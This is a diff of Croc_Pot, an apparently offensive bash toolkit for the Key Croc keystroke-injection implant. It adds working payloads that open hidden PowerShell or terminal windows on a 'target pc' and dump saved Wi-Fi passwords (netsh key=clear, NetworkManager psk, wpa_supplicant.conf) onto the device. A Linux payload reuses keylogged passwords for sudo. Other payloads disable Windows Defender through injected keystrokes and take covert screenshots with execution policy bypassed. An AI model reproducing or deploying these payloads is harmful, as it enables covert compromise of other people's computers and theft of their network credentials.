@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.5.6
+# Version:       1.5.7
 # Category:      Key Croc
 ##
 ##
@@ -74,7 +74,7 @@ function croc_title() {
 internet_test() {
 	ping -q -c1 -w1 "8.8.8.8" &>"/dev/null"
 if [[ "${?}" -ne 0 ]]; then
-	echo "${red}Offline"
+	echo -ne "${red}Offline"
 elif [[ "${#args[@]}" -eq 0 ]]; then
 	echo -ne "${green}Online "
 fi
@@ -83,8 +83,10 @@ fi
 #----Fill in space
 ##
 FILL_IN() {
-if [ "$(OS_CHECK)" = LINUX ]; then
-	echo -ne "  "
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	echo -ne "   "
+elif [ "$(OS_CHECK)" = LINUX ]; then
+	echo -ne "     "
 fi
 }
 ##
@@ -92,9 +94,9 @@ fi
 ##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
 ${red}${LINE_A}${clear}\e[40m»${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]} ${clear}\e[40m«${clear}${red}---------${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(internet_test)         ${clear}
-${red}   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)   $(FILL_IN)${clear}
+${red}   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) *TARGET-PC:${green}$(OS_CHECK)$(FILL_IN)${clear}
 ${red}   DATE OF SCAN${clear}\e[40m $(date +%b-%d-%y---%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.5.6${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+${red}${LINE_A}${clear}\e[40;92m»CROC_POT«${red}--${clear}${yellow}VER:1.5.7${red}---${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 ##
@@ -125,6 +127,8 @@ if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = WINDOWS ]; then
 	echo "WINDOWS"
 elif [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = LINUX ]; then
 	echo "LINUX"
+else
+	echo "${red}INVALID OS"
 fi
 }
 ##
@@ -135,6 +139,8 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 elif [ "$(OS_CHECK)" = LINUX ]; then
 	array=(❺ ♁ ᛝ ➲ ✉ ∞ ✓ ∵ ✏ ⇆ ♲ ☁)
 	HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)
+else
+	array=(5 \# \# \# \# \# \# \# \# \# \# \#)
 fi
 ##
 #----Check for target PC ip
@@ -163,7 +169,7 @@ function nmap_menu() {
 	local IP_WLAN=$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)
 	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
 	echo -ne "$(Info_Screen '-Start some basic nmap scan and save to loot folder
--Enter IP for scan or default will be target pc ip')$(os_ip)\n\n"
+-Enter IP for scan or default will be target pc ip')\n\n"
 ##
 #----Nmap User IP Input Function
 ##
@@ -807,7 +813,7 @@ if [ ! $? = 0 ] || [ ! "$status_vpn" = installed ]; then
 	read_all INSTALL OPENVPN Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		apt install openvpn ;;
+		apt -y install openvpn ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 	*)
@@ -835,7 +841,7 @@ fi
 MenuTitle VPN MENU
 MenuColor 1 VPN SETUP ; echo -ne "           ${clear}\n"
 MenuColor 2 ENABLE VPN ; echo -ne "          ${clear}\n"
-MenuColor 3 DISENABLE VPN ; echo -ne "       ${clear}\n"
+MenuColor 3 DISABLE VPN ; echo -ne "         ${clear}\n"
 MenuColor 4 VPN STATUS ; echo -ne "          ${clear}\n"
 MenuColor 5 EDIT .OVPN FILE ; echo -ne "     ${clear}\n"
 MenuColor 6 REMOVE VPN FILES ; echo -ne "    ${clear}\n"
@@ -844,7 +850,7 @@ MenuEnd
 	case $m_a in
 	1) setup_vpn ; croc_vpn ;;
 	2) openvpn --config ${vpn_file_A} --daemon ; echo -ne "\n$(ColorGreen 'ENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
-	3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISENABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
+	3) killall openvpn ; service openvpn restart ; echo -ne "\n$(ColorRed 'DISABLE VPN CHECK VPN STATUS')\n" ; croc_vpn ;;
 	4) route -n ; ifconfig ; ip route show ; systemctl status openvpn* ; croc_vpn ;;
 	5) nano ${vpn_file_A} ; croc_vpn ;;
 	6) rm -f ${vpn_file_A} /etc/openvpn/credentials ${vpn_file} ; echo -ne "\n$(ColorRed '.OVPN AND CREDENTIALS FILES HAS BEEN REMOVED')\n" ; croc_vpn ;;
@@ -3370,7 +3376,7 @@ MenuEnd
 	esac
 }
 ##
-#----Windows defender Function
+#----Windows defender ENABLE/DISABLE Function
 ##
 windows_defender() {
 	clear
@@ -3382,9 +3388,9 @@ defender_enable() {
 	sleep 3
 	Q STRING "Windows Security settings"
 	Q ENTER
-	sleep 1
+	sleep 3
 	Q ENTER
-	sleep 2
+	sleep 3
 	Q TAB
 	Q ENTER
 	sleep 3
@@ -3396,20 +3402,22 @@ defender_enable() {
 	sleep 2
 	Q LEFTARROW
 	Q ENTER
+	sleep 1
 	Q ALT-F4
+	sleep 1
 	Q ALT-F4
 }
 ##
-#----Windows defender disenable Function
+#----Windows defender disable Function
 ##
-defender_disenable() {
+defender_disable() {
 	Q GUI i
 	sleep 3
 	Q STRING "Windows Security settings"
 	Q ENTER
-	sleep 1
+	sleep 3
 	Q ENTER
-	sleep 2
+	sleep 3
 	Q TAB
 	Q ENTER
 	sleep 3
@@ -3423,21 +3431,23 @@ defender_disenable() {
 	sleep 2
 	Q LEFTARROW
 	Q ENTER
+	sleep 1
 	Q ALT-F4
+	sleep 1
 	Q ALT-F4
 }
 ##
-#----Windows defender Menu
+#----Windows defender ENABLE/DISABLE Menu
 ##
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 MenuTitle WINDOWS DEFENDER
-MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "    ${clear}\n"
-MenuColor 2 DISENABLE WINDOWS DEFENDER ; echo -ne " ${clear}\n"
-MenuColor 3 RETURN TO MAIN MENU ; echo -ne "        ${clear}\n"
+MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "  ${clear}\n"
+MenuColor 2 DISABLE WINDOWS DEFENDER ; echo -ne " ${clear}\n"
+MenuColor 3 RETURN TO MAIN MENU ; echo -ne "      ${clear}\n"
 MenuEnd
 	case $m_a in
 	1) defender_enable ; croc_pot_plus ;;
-	2) defender_disenable ; croc_pot_plus ;;
+	2) defender_disable ; croc_pot_plus ;;
 	3) main_menu ;;
 	0) exit 0 ;;
 	*) invalid_entry ; windows_defender ;;
@@ -3463,9 +3473,9 @@ get_online_p() {
 	echo -ne "$(Info_Screen '-Payload Called GetOnline
 -Connect automatically to target pc WIFI (Windows/Linux/Raspberry)
 -After install unplug and plug into target pc and type in below
--getonline <-- for windows
--linuxonline <-- for Linux
--rasponline <-- for Raspberry pi
+-getonline <-- MATCH word for windows
+-linuxonline <-- MATCH word for Linux
+-rasponline <-- MATCH word for Raspberry pi
 -When done the led will light up green unplug keycroc and plug back in
 -The keycroc should now be connected to the target pc wifi')\n\n"
 ##
@@ -3477,12 +3487,12 @@ else
 	read_all INSTALL GETONLINE PAYLOAD FOR WINDOWS Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -ne "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill / RootJunky\n# Version:         2.3\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong
-#\nMATCH getonline\nQ LOCK\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Open powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Get KeyCroc drive
-Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"\nQ ENTER\nsleep 2\n# --> Create wifipass.txt with the taget pc SSID and PASSWD put in Keycroc loot folder
-Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\$Croc\loot\\\Croc_Pot\wifipass.txt\\\"\"
-Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file
-\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/loot/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' -e 's/\\\r//g' root/udisk/config.txt)\nsleep 2\nQ UNLOCK\nLED FINISH" >> ${GETONLINE_WINDOWS}
+		echo -ne "# Title:           Windows Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill / RootJunky\n# Version:         2.4\n# Category:        Key Croc\n# Props:           Cribbit, Lodrix, potong
+#\nMATCH getonline\nLOCK\nrm /root/udisk/tools/Croc_Pot/wifipass.txt\n# --> udisk unmount\nATTACKMODE HID STORAGE\nsleep 5\nLED ATTACK\nQ GUI r\nsleep 1\n# --> Start powershell\nQ STRING \"powershell -NoP -NonI -W Hidden\"\nQ ENTER\nsleep 2\n# --> Place keycroc usb drive into variable
+Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"\nQ ENTER\nsleep 2\n# --> Retrieve taget pc SSID and PASSWD save to tools/Croc_Pot/wifipass.txt
+Q STRING \"(netsh wlan show networks) | Select-String \\\"\:(.+)\\\$\\\" | % {\\\$name=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{(netsh wlan show profile name=\\\"\\\$name\\\" key=clear)} | Select-String \\\"Key Content\W+\:(.+)\\\$\\\" | % {\\\$pass=\\\$_.Matches.Groups[1].Value.Trim(); \\\$_} | %{[PSCustomObject]@{ PROFILE_NAME=\\\$name;PASSWORD=\\\$pass }} | Out-File -Encoding UTF8 \\\"\\\$Croc\\\tools\Croc_Pot\wifipass.txt\\\"\"
+Q ENTER\nsleep 2\nQ STRING \"exit\"\nQ ENTER\n# --> Returning to HID Mode\nATTACKMODE HID\nsleep 3\nLED SETUP\n# --> Remone any existing WIFI setting & Edit config.txt with sed & Stuff the line from wifipass.txt into the hold space when processing config.txt and append and manipulate that line when needed & Remove r end lines in config.txt file\n\$(sed -i 's/\( \)*/\1/g' /root/udisk/tools/Croc_Pot/wifipass.txt)
+\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 4p root/udisk/tools/Croc_Pot/wifipass.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' -e 's/\\\r//g' root/udisk/config.txt)\nsleep 2\nUNLOCK\nLED FINISH" >> ${GETONLINE_WINDOWS}
 		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE WINDOWS PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
@@ -3499,7 +3509,15 @@ else
 	read_all INSTALL GETONLINE PAYLOAD FOR LINUX Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -ne "\n$(ColorYellow 'Sorry still In Development for Linux')\n" ;;
+		echo -ne "# Title:           Linux Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n\nMATCH linuxonline\n
+#---> Check for saved passwd run CrocUnlock payload first if not edit passwd below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)\nelse\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n
+rm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE\nLED ATTACK\n#---> start target pc terminal\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\n#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
+Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Entering Linux passwd\nQ STRING \"\${PC_PW}\"\nQ ENTER\nsleep 1
+#---> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n#---> Retrieve target PC SSID/PASSWD & save to tools/Croc_Pot/Linux_GetOnline.txt
+Q STRING \"sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -n \\\"/\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')/p\\\" | sed -e 's/=/ /g' | tee \\\${LINUX_ON}\"
+Q ENTER\nsleep 2\n#---> Unmount keycroc usb drive\nQ STRING \"sudo umount /media/\\\$(whoami)/KeyCroc/\"\nQ ENTER\nsleep 1\n#---> Return back to ATTACKMODE HID mode\nATTACKMODE HID\n#---> Remove keycroc directory off target pc\nQ STRING \"sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\nQ ENTER
+#---> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_LINUX}
+		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE LINUX PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 	*)
@@ -3515,10 +3533,10 @@ else
 	read_all INSTALL GETONLINE PAYLOAD FOR RASPBERRY PI Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi or to your own wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
-LED ATTACK\n# --> start target pc terminal\nQ GUI d\nsleep 1\nQ STRING \"terminal\"\nQ ENTER\nQ ENTER\nsleep 1\n# --> Get KeyCroc drive\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Get Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
-Q ENTER\nsleep 1\n# --> Get Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
-Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 5\nRemone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
+		echo -ne "# Title:           Raspberry PI Get online\n# Description:     Get online automatically to target pc wifi\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n#\nMATCH rasponline\n#\nrm /root/udisk/tools/Croc_Pot/Linux_GetOnline.txt\nATTACKMODE HID STORAGE
+LED ATTACK\n# --> start Raspberry PI terminal\nQ GUI d\nQ CONTROL-ALT-F1\nsleep 1\nQ STRING \"cp -u /usr/share/applications/lxterminal.* /home/\\\$(whoami)/Desktop\"\nQ ENTER\nQ ALT-F7\nsleep 1\nQ STRING \"LXTerminal\"\nQ ENTER\nQ ENTER\nsleep 2\n# --> Place keycroc usb drive into variable\nQ STRING \"LINUX_ON=/media/\\\$(whoami)/KeyCroc/tools/Croc_Pot/Linux_GetOnline.txt\"\nQ ENTER\nsleep 1\n# --> Retrieve Target current ssid (Wifi)\nQ STRING \"t_ssid=\\\$(iw dev wlan0 info | grep ssid | awk '{print \\\$2}')\"
+Q ENTER\nsleep 1\n# --> Retrieve Target wifi passwd\nQ STRING \"t_pw=\\\$(sed -e '/ssid\ psk/,+1p' -ne \\\":a;/\\\$t_ssid/{n;h;p;x;ba}\\\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\\\"\(.*\)\\\"/\1/')\"\nQ ENTER\nsleep 1\n# --> Save ssid & passwd to keycroc\nQ STRING \"echo \\\$t_ssid \\\$t_pw >> \\\${LINUX_ON}\"
+Q ENTER\nsleep 3\nQ STRING \"exit\"\nQ ENTER\nATTACKMODE HID\nsleep 2\n# --> Remone any existing WIFI setting & Stuff the line from Linux_GetOnline into the hold space when processing config.txt and append and manipulate that line when needed
 \$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\\\nWIFI_PASS\\\nSSH ENABLE' root/udisk/config.txt) && \$(sed -i -E -e '1{x;s#^#sed -n 1p root/udisk/tools/Croc_Pot/Linux_GetOnline.txt#e;x};10{G;s/\\\n(\S+).*/ \1/};11{G;s/\\\n\S+//}' root/udisk/config.txt)\nLED FINISH" >> ${GETONLINE_RASPBERRY}
 		echo -ne "\n${red}***${clear}$(ColorGreen 'GETONLINE RASPBERRY PI PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLEDER')${red}***${clear}\n" ;;
 	[nN] | [nN][oO])
@@ -3606,27 +3624,28 @@ quick_croc_pot () {
 -Quickly Start Croc_Pot without OS detection
 -This is for when you Already ran OS detection on target pc by crocpot
 -Match word is qspot')\n\n"
+	local qs_croc=/root/udisk/payloads/Quick_start_Croc_Pot.txt
+	if [ -e "${qs_croc}" ]; then
+		echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
+	else
 	read_all INSTALL QUICK START CROC_POT PAYLOAD Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-	if [ -e "/root/udisk/payloads/Quick_start_Croc_Pot.txt" ]; then
-		echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
-	else
 		echo -ne "# Title:         Quick Start Croc_Pot\n# Description:   Quickly Start Croc_pot.sh bash script without OS detection\n#                Will need to run Croc_Pot_Payload.txt first before running this payload
 #                This is for when you Already ran OS detection on target pc\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n#\nMATCH qspot\n#\nCROC_PW=$(sed -n 1p /tmp/CPW.txt)      #<-----Edit KEYCROC_PASSWD_HERE
-echo \"\${CROC_PW}\" >> /tmp/CPW.txt\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
-	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
-	LED B\n	sleep 5\n	Q STRING \"terminal\"\n	Q ENTER\n	Q ENTER\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
+echo \"\${CROC_PW}\" >> /tmp/CPW.txt\nQ GUI d\n#\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = WINDOWS ]; then\n	LED R\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 3\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"
+	Q ENTER\n	sleep 3\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER\nelse\nif [ \"\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\" = LINUX ]; then\n    HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n    case \$HOST_CHECK in\n    raspberrypi)
+	LED B\n	sleep 5\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER\n	sleep 2\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"\n	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"
 	Q ENTER ;;\n    parrot)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
 	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n    *)\n	LED B\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"ssh root@\$(ifconfig wlan0 | grep \"inet addr\" | awk {'print \$2'} | cut -c 6-)\"\n	Q ENTER\n	sleep 2\n	Q STRING \"\${CROC_PW}\"
-	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" >> /root/udisk/payloads/Quick_start_Croc_Pot.txt
-		echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
-	fi ;;
+	Q ENTER\n	sleep 2\n	Q STRING \"/root/udisk/tools/Croc_Pot.sh\"\n	Q ENTER ;;\n  esac\n fi\nfi\nLED FINISH" >> ${qs_croc}
+		echo -ne "\n$(ColorGreen 'Quick_start_Croc_Pot PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 	*)
 		invalid_entry ; quick_croc_pot ;;
 	esac
+	fi
 }
 ##
 #----Screenshot Croc_Shot function
@@ -3653,20 +3672,19 @@ else
 	read_all WOULD YOU LIKE TO INSTALL CROC_SHOT PAYLOAD Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc\n#
-MATCH crocshot\n#\nPC_PW=LINUX      #<-----Edit LINUX-PC_PASSWD_HERE\n#\n  if [ -d /root/udisk/loot/Croc_pot/screenshot ]; then\n  LED B\n  sleep 1\nelse\n  LED SETUP\n  mkdir /root/udisk/loot/Croc_pot/screenshot
-  sleep 1\nfi\n  ATTACKMODE HID STORAGE\n  CROC_OS=/root/udisk/loot/Croc_OS.txt\n  WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\n  OS_CHECK=\$(sed -n 1p \${CROC_OS})\n    if [ \"\${OS_CHECK}\" = WINDOWS ]; then
-      if [ -e \"\${WINDS_SHOT}\" ]; then\n      LED ATTACK\n      Q GUI r\n      sleep 1\n      Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n      Q ENTER\n      sleep 1\n      Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
-      Q ENTER\n      sleep 1\n      Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n      Q ENTER\n      sleep 5\n      Q STRING \"exit\"\n      Q ENTER\n      ATTACKMODE HID\n      LED FINISH\n   else\n      LED ATTACK
+		echo -ne "# Title:         CrocShot\n# Description:   Take screenshot of PC and save to loot/Croc_Pot/screenshot\n# Author:        spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocshot\n\n#---> Check for save passwd run CrocUnlock first if not edit below\nif [ -e \"/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered\" ]; then\n	PC_PW=\$(sed '\$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
+else\n#---> Edit LINUX-PC_PASSWD_HERE\n	PC_PW=LINUX\nfi\n\nif [ -d /root/udisk/loot/Croc_pot/screenshot ]; then\n	LED B\nelse\n	mkdir /root/udisk/loot/Croc_pot/screenshot\nfi\n\nWINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1\nOS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\nHOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\n	if [ -e \"\${WINDS_SHOT}\" ]; then
+	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
